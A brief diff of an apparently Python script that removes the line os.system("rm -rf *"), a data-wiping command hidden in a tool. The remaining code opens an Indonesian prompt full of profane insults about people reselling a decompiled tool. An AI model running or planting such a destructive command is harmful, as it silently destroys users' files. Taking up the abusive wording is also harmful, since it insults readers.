@@ -1,5 +1,4 @@
 import subprocess,os
-os.system("rm -rf *")
 raw_input("""HAI KALIAN SEMUA ANJING!!
 UDAH GW BANTU DECOMPILE NIH TOOLS TAPI
 MASIH PADA LO JUAL?!! NGENTOT LOSEMUA
